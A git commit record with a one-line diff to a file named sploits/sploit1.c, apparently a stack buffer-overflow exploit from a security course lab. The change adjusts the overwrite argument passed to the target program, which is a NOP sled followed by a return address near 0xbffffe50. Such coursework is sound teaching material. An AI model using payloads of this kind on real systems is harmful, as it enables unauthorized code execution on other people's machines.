c852088319989413e59ce7a99134ee504e08663a
pandaxuCESO <49774769+30PandaX@users.noreply.github.com>
2021-12-08 16:01:27 -0500

    Update sploit1.c

--- sploits/sploit1.c
+++ sploits/sploit1.c
@@ -13,7 +13,7 @@ int main(void)
   char *env[1];
 
   args[0] = TARGET;
-  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x49\xfe\xff\xbf";
+  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x4a\xfe\xff\xbf";
   // 0xbffffe50
   args[2] = NULL;
   
